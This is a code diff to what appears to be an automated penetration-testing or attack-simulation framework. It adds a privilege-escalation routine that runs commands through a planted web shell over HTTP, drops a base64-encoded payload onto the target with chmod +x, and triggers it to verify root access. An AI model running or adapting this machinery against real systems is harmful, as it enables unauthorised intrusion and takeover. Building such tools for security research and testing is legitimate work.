@@ -7,6 +7,7 @@ actions return error="not_implemented" so HybridExecutor can fall through
 to the mock implementation while we incrementally fill these in
 """
 
+import base64
 import re
 import shutil
 import socket
@@ -281,7 +282,7 @@ class RealExecutor:
         matched = [
             v["id"]
             for v in vulns_for(host, state)
-            if vuln_reqs_met(v, host_paths, state)
+            if vuln_reqs_met(v, host_paths, state, host_id=action.target_host)
         ]
         if not matched:
             return ExecutionResult(action, False, error="no_vulns_identified")
@@ -423,11 +424,80 @@ class RealExecutor:
                 raw="\n".join(log_lines),
             )
 
+        shell_url = f"{base}{shell_path}"
         return ExecutionResult(
             action,
             True,
-            observed={"access_level": "web_shell"},
-            artifacts={"shell_url": f"{base}{shell_path}"},
+            observed={"access_level": "web_shell", "shell_url": shell_url},
+            artifacts={"shell_url": shell_url},
+            raw="\n".join(log_lines),
+        )
+
+    def _do_exploit_privesc(self, action, state, scenario):
+        host = self._host(scenario, action.target_host)
+        if host is None:
+            return ExecutionResult(action, False, error="host_unknown")
+
+        recipe = recipe_for(host, state, "root")
+        needed = (
+            "enum_command",
+            "enum_indicator",
+            "payload_path",
+            "payload_content",
+            "trigger_command",
+            "verify_command",
+            "verify_indicator",
+        )
+        if recipe is None or any(k not in recipe for k in needed):
+            return ExecutionResult(action, False, error="recipe_missing")
+
+        shell_url = state.shell_urls.get(action.target_host)
+        if not shell_url:
+            return ExecutionResult(action, False, error="no_shell_url")
+
+        log_lines: list[str] = []
+
+        def run(cmd: str) -> str:
+            try:
+                resp = requests.get(
+                    shell_url,
+                    params={"cmd": cmd},
+                    timeout=self.http_request_timeout,
+                )
+                log_lines.append(f"GET cmd={cmd!r} -> {resp.status_code} ({len(resp.text)} bytes)")
+                return resp.text
+            except requests.RequestException as exc:
+                log_lines.append(f"ERR {exc.__class__.__name__} on cmd={cmd!r}")
+                return ""
+
+        enum_out = run(recipe["enum_command"])
+        if not re.search(recipe["enum_indicator"], enum_out):
+            return ExecutionResult(
+                action, False, error="not_vulnerable", raw="\n".join(log_lines)
+            )
+
+        if "setup_command" in recipe:
+            run(recipe["setup_command"])
+
+        b64 = base64.b64encode(recipe["payload_content"].encode()).decode()
+        drop_cmd = (
+            f"echo {b64} | base64 -d > {recipe['payload_path']} "
+            f"&& chmod +x {recipe['payload_path']}"
+        )
+        run(drop_cmd)
+
+        run(recipe["trigger_command"])
+
+        verify_out = run(recipe["verify_command"])
+        if not re.search(recipe["verify_indicator"], verify_out):
+            return ExecutionResult(
+                action, False, error="privesc_unverified", raw="\n".join(log_lines)
+            )
+
+        return ExecutionResult(
+            action,
+            True,
+            observed={"access_level": "root", "compromised": True},
             raw="\n".join(log_lines),
         )
 
